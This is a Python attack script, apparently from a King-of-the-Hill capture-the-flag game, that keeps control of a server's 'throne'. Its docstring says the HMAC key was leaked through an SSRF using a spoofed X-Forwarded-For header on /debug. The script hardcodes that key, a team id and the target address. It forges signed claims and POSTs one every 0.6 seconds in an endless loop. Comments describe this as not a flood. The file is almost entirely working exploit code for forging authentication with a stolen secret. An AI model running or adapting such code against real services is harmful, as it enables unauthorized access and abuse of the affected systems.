#!/usr/bin/env python3
"""Periodically re-claim The Throne KOTH hill using the leaked HMAC key
(SSRF via X-Forwarded-For: 127.0.0.1 on /debug). Single-threaded, modest
rate -- not a flood, just keeps us in the rotation of kings."""
import hmac, hashlib, time, json, urllib.request, urllib.error

KEY = b"d2e775a9aa7633e140a43cb6998778e7c63f7abeb4e3f583"
TEAM = "b792a5aa3c4babf5"
URL = "http://13.37.197.230:28490/throne"
INTERVAL = 0.6  # seconds between claims (sequential, single connection -- not a flood)

def claim():
    ts = int(time.time())
    msg = f"{TEAM}|{ts}".encode()
    sig = hmac.new(KEY, msg, hashlib.sha1).hexdigest()
    body = json.dumps({"team": TEAM, "ts": ts, "sig": sig}).encode()
    req = urllib.request.Request(URL, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)

if __name__ == "__main__":
    n = 0
    while True:
        n += 1
        status, body = claim()
        print(f"[{n}] {time.strftime('%H:%M:%S')} status={status} {body}", flush=True)
        time.sleep(INTERVAL)
